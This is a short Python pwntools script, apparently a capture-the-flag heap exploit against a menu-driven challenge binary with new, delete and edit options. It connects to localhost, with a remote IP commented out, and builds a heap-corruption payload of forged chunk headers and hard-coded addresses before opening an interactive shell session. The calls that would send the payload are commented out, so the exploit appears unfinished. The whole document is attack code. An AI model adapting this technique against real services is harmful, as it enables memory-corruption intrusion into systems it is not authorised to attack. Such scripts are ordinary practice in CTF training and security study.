#!/usr/bin/python

from pwn import *

DEBUG = True

#p = remote("52.68.77.85", 8731)
p = remote("localhost", 4924)
#p = remote("localhost", 4000)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def new(size, content, name):
  r("choice:")
  p.sendline("1")

  r("Size :")
  p.sendline(str(size))

  r("Content:")
  p.send(content)
  sleep(0.1)

  r("Name:")
  p.send(name)
  sleep(0.1)

def delete():
  r("choice:")
  p.sendline("2")

def edit(content):
  r("choice:")
  p.sendline("3")

  r("Content:")
  p.send(content)

new(0x200, "A", "AAAAAAAA")

payload = p64(0)
payload += p64(0x100)
payload += "A" * 0x10
payload += p64(0x603190)
#payload += p64(0x9811a0)
payload += "A" * 0xe8
payload += p64(0)
payload += p64(0x70 | 0x1)
payload += p64(0x60209d + 0x8)
payload += "A" * (0x60 - 0x8)
payload += p64(0x70)
payload += p64(0x2b0)
payload += "A" * (0x3ff - len(payload))
payload += "\n"

# edit(payload)

# delete()

#new(0x70, "\x00" * 0x6f + "\n", "AAAAAAA\n")

p.interactive()

p.close()
